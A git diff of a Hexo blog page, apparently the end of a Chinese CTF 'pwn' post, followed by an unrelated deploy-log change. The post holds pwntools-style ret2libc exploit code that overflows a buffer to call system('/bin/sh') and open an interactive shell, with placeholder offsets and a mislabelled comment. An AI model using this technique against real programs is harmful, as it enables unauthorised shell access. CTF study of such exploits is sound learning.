+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__libc_start_main=<span class="number">0x000</span><span class="comment">//__libc_start_main函数的偏移地址</span></span><br><span class="line">system=<span class="number">0x00000</span><span class="comment">//system函数的偏移地址，</span></span><br><span class="line">str_bin_sh=<span class="number">0x000</span><span class="comment">//__libc_start_main函数的偏移地址</span></span><br><span class="line">以上这三个的数值由网上查阅</span><br><span class="line">libcbase_addr=libcaddr-__libc_start_main</span><br><span class="line">system_addr=libcbase_addr+system</span><br><span class="line">binsh_addr=libcbase_addr+str_bin_sh</span><br><span class="line">payload2 = b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*<span class="number">22</span> + p32(sys_addr) + b<span class="number">&#x27;</span>AAAA<span class="number">&#x27;</span> + p32(binsh_addr)</span><br><span class="line"><span class="comment">//这里中间的数为了平衡栈顶要在中间加上4字节的垃圾数据</span></span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>如果要使用LibcSearcher来用着要在要在前面加上</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from LibcSearcher import *</span><br></pre></td></tr></table></figure>
+
+
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+	<a class="article-category-link" href="/categories/CTF/">CTF</a>
+	</div>
+
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-C语言题目" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -3334,7 +3420,7 @@
 
 <p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 <p><img src="/2024/03/26/hello-world/002917-16858097570092.jpg" alt="002917-16858097570092"></p>
-<p>INFO  Copying files from extend dirs…<br>On branch master<br>nothing to commit, working tree clean<br>Everything up-to-date<br>branch ‘master’ set up to track ‘<a href="mailto:&#x67;&#105;&#116;&#x40;&#x67;&#x69;&#116;&#x68;&#x75;&#x62;&#x2e;&#99;&#111;&#x6d;">&#x67;&#105;&#116;&#x40;&#x67;&#x69;&#116;&#x68;&#x75;&#x62;&#x2e;&#99;&#111;&#x6d;</a>:2023478&#x2F;2023478.github.io.git&#x2F;main’.<br>INFO  Deploy done: git</p>
+<p>INFO  Copying files from extend dirs…<br>On branch master<br>nothing to commit, working tree clean<br>Everything up-to-date<br>branch ‘master’ set up to track ‘<a href="mailto:&#x67;&#105;&#116;&#x40;&#x67;&#105;&#116;&#x68;&#x75;&#98;&#46;&#99;&#x6f;&#109;">&#x67;&#105;&#116;&#x40;&#x67;&#105;&#116;&#x68;&#x75;&#98;&#46;&#99;&#x6f;&#109;</a>:2023478&#x2F;2023478.github.io.git&#x2F;main’.<br>INFO  Deploy done: git</p>
 
       
     </div>
